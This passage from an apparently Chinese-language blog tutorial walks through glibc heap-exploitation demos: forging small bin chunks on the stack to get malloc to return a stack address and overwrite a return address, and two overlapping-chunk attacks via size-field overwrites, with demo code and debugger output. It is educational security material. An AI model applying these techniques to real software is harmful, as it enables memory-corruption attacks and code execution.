until unsorted chunks are</span><br><span class="line">   processed to find best fit. But for small ones, fits are exact</span><br><span class="line">   anyway, so we can check now, which is faster.)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取 small bin 的索引</span><br><span class="line">    idx &#x3D; smallbin_index(nb);</span><br><span class="line">    &#x2F;&#x2F; 获取对应 small bin 中的 chunk 指针</span><br><span class="line">    bin &#x3D; bin_at(av, idx);</span><br><span class="line">    &#x2F;&#x2F; 先执行 victim&#x3D; last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">    &#x2F;&#x2F; 如果 victim &#x3D; bin ，那说明该 bin 为空。</span><br><span class="line">    &#x2F;&#x2F; 如果不相等，那么会有两种情况</span><br><span class="line">    if ((victim &#x3D; last(bin)) !&#x3D; bin) &#123;</span><br><span class="line">        &#x2F;&#x2F; 第一种情况，small bin 还没有初始化。</span><br><span class="line">        if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;</span><br><span class="line">            &#x2F;&#x2F; 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        &#x2F;&#x2F; 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">            bck &#x3D; victim-&gt;bk;</span><br><span class="line">            &#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">            if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">                errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                goto errout;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">            set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">            bin-&gt;bk &#x3D; bck;</span><br><span class="line">            bck-&gt;fd &#x3D; bin;</span><br><span class="line">            &#x2F;&#x2F; 如果不是 main_arena，设置对应的标志</span><br><span class="line">            if (av !&#x3D; &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">            &#x2F;&#x2F; 细致的检查</span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            &#x2F;&#x2F; 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">            void *p &#x3D; chunk2mem(victim);</span><br><span class="line">            &#x2F;&#x2F; 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的这部分我们可以看出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">bck &#x3D; victim-&gt;bk;</span><br><span class="line">&#x2F;&#x2F; 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd !&#x3D; victim)) &#123;</span><br><span class="line">    errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 设置 victim 对应的 inuse 位</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">&#x2F;&#x2F; 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">bin-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; bin;</span><br></pre></td></tr></table></figure>

<p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chun。</p>
<p>调试：</p>
<p>首先，我们创建一个 small bin chunk。然后在栈上伪造两个 chunk。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926152853.png"></a></p>
<p>伪造的两个 chunk ， chunk 1 的 fd 指向 victim chunk，bk 指向 chunk2 ，chunk 2 的fd 指向 chunk 1。这样就构造了一个 small bin 链。</p>
<p>由于上文提到的  check </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">7</span> <span class="keyword">else</span></span><br><span class="line"> <span class="number">8</span>     &#123;</span><br><span class="line"> <span class="number">9</span>       bck = victim-&gt;bk;</span><br><span class="line"><span class="number">10</span>     <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">12</span>                   errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line"><span class="number">13</span>                   <span class="keyword">goto</span> errout;</span><br><span class="line"><span class="number">14</span>                 &#125;</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span>        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line"><span class="number">17</span>        bin-&gt;bk = bck;</span><br><span class="line"><span class="number">18</span>        bck-&gt;fd = bin;</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>        [ ... ]</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span> */</span><br></pre></td></tr></table></figure>

<p>所以伪造了 两个chunk 以及他们的 fd ，bk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>



<p>在 free 掉 victim 之前，我们 malloc 了一块 size 为1000的chunk，只是为了确保在 free 时 victim chunk 不会被合并进 top chunk 里。</p>
<p>然后我们释放掉 victim， 并申请一块比较大的chunk，只需要大到让 malloc 在 unsorted bin 中找不到合适的就可以了，这样就会让 victim 被整理到 smallbins中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x7ffff7dd1bb8 (main_arena+184) —▸ 0x603000 ◂— 0x7ffff7dd1bb8</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>



<p>接着就是漏洞利用的一个重点，我们假设我们有机会去修改victim chunk 的 bk 指针。并让他指向我们在栈上 fake 的chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png"></a></p>
<p>这个时候 ， victim chunk的bk指向 stack_buffer_1,   fake chunk 1 的fd 指向了 victim chunk。我们知道 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时整条链是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head  &lt;-fake chunk2 &lt;- facke chunk1 &lt;- victim chunk</span><br></pre></td></tr></table></figure>

<p>fake chunk 2 的 bk 指向了一个未定义的地址，如果能通过内存泄露等手段，拿到 HEAD 的地址并填进去，整条链就闭合了。当然这里完全没有必要这么做。</p>
<p>紧接着，我们 malloc 一块 chunk，如果我们malloc 的大小正好是 victim chunk 的大小，这个时候系统会将 victim chunk 取出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926231954.png"></a></p>
<p>然后，我们再 malloc 一块。这个时候，我们就能欺骗系统，在stack栈上返回一块chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">101</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="number">102</span>   <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="number">103</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(100)\n&quot;</span>);</span><br><span class="line">  <span class="number">104</span></span><br><span class="line">► <span class="number">105</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br></pre></td></tr></table></figure>

<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233627.png"></a></p>
<p>然后我们可以完成攻击</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">108</span>   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">► <span class="number">109</span>   <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="number">110</span>   <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br></pre></td></tr></table></figure>



<p>P4 + 40 的位置刚好是 eip的的位置。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180926233920.png"></a></p>
<p>最后，我们说的是small bin 链的构造，其实我这里用的是 fastbin ，其释放后虽然是被加入到 fast bins 中，而small bin是释放后 放入 unsorted bin，但 malloc 之后，也会被整理到 small bins 里。</p>
<h3 id="0x09-overlapping-chunks"><a href="#0x09-overlapping-chunks" class="headerlink" title="0x09 overlapping_chunks"></a>0x09 overlapping_chunks</h3><p>简单的堆重叠，通过修改 size，吞并邻块，然后再下次 malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> 	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="number">23</span> 	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="number">24</span> 	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>首先分配，三个chunk。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603200 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x81,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br></pre></td></tr></table></figure>

<p>紧接着 free 掉 chunk2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure>

<p>这个时候 chunk 2 被分配到了 unsortedbin</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x603100 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x3131313131313131,</span><br><span class="line">  size = 0x101,</span><br><span class="line">  fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x3232323232323232,</span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PwnLife&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x603100 ◂— 0x7ffff7dd1b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>然后，假设我们这个时候可以通过堆溢出修改 chunk 2的size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">42</span> 	<span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line"><span class="number">43</span> 	<span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line"><span class="number">44</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line"><span class="number">45</span> 		 evil_chunk_size, evil_region_size);</span><br><span class="line"><span class="number">46</span></span><br><span class="line"><span class="number">47</span> 	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x603000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x101</span>,</span><br><span class="line">  fd = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  bk = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x3131313131313131</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603100</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x3131313131313131</span>,</span><br><span class="line">  size = <span class="number">0x181</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  fd_nextsize = <span class="number">0x3232323232323232</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x3232323232323232</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x603280</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x3333333333333333</span>,</span><br><span class="line">  size = <span class="number">0x20d81</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候，我们发现 chunk 2的size被修改后，吞并了 chunk3，如果我们这时候 malloc 一块 0x180 的chunk。即将会把 chunk2 和chunk3 一起分配出来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4 = <span class="built_in">malloc</span>(evil_region_size); <span class="comment">//evil_region_size = 0x180-8</span></span><br></pre></td></tr></table></figure>



<p>当我们对 p4 进行写操作的时候</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">66</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="number">67</span> 	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="number">68</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="number">69</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure>

<p>顺便把 p3 也写了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/40gx 0x603100</span><br><span class="line">0x603100:	0x3131313131313131	0x0000000000000181</span><br><span class="line">0x603110:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603120:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603130:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603140:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603150:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603160:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603170:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603180:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603190:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x6031a0:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x6031b0:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x6031c0:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x6031d0:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x6031e0:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x6031f0:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603200:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603210:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603220:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603230:	0x3434343434343434	0x3434343434343434</span><br><span class="line"></span><br><span class="line">PwnLife&gt; p p3</span><br><span class="line"><span class="variable">$13</span> = (intptr_t *) 0x603210</span><br><span class="line">PwnLife&gt; x/20gx  p3</span><br><span class="line">0x603210:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603220:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603230:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603240:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603250:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603260:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603270:	0x3434343434343434	0x3434343434343434</span><br><span class="line">0x603280:	0x3434343434343434	0x0000000000020d81</span><br><span class="line">0x603290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6032a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>

<p>我们也可以去修改 p3 ，修改 p4的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">71</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="number">72</span> 	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="number">73</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="number">74</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure>





<h3 id="0x10-overlapping-chunks-2"><a href="#0x10-overlapping-chunks-2" class="headerlink" title="0x10 overlapping_chunks_2"></a>0x10 overlapping_chunks_2</h3><p>同样是堆重叠问题，这里是在 free 之前修改 size 值，使 free 错误地修改了下一个 chunk 的 prev_size 值，导致中间的 chunk 强行合并。</p>
<p>我们这里 malloc 五块chunk，第五块的作用是防止 chunk 4 被free 后被放入 top chunk。然后这里的覆盖目标是 chunk2 到chunk4。 </p>
<p>首先 free 掉 chunk 4</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p4);</span><br></pre></td></tr></table></figure>



<p>由于 chunk 4现在是 free 状态，这个时候 chunk 5 的presize 如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PwnLife&gt; p p5</span><br><span class="line"><span class="variable">$3</span> = (intptr_t *) 0x603fd0</span><br><span class="line">PwnLife&gt; x/20gx p5-4</span><br><span class="line">0x603fb0:	0x4444444444444444	0x4444444444444444                  &lt;--- chunk 5</span><br><span class="line">0x603fc0:	0x00000000000003f0	0x00000000000003f0     &lt;---prev size   / size  </span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br><span class="line">PwnLife&gt;</span><br></pre></td></tr></table></figure>



<p>紧接着，我们假设 chunk 1 有堆溢出，我们可以通过堆溢出修改 chunk 2的size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p p2</span><br><span class="line">$<span class="number">4</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x603400</span></span><br><span class="line">PwnLife&gt; x/<span class="number">20</span>gx p2<span class="number">-2</span></span><br><span class="line"><span class="number">0x6033f0</span>:	<span class="number">0x4141414141414141</span>	<span class="number">0x00000000000007e1</span>      &lt;--- size</span><br><span class="line"><span class="number">0x603400</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603410</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603420</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x603430</span>:	<span class="number">0x4242424242424242</span>	<span 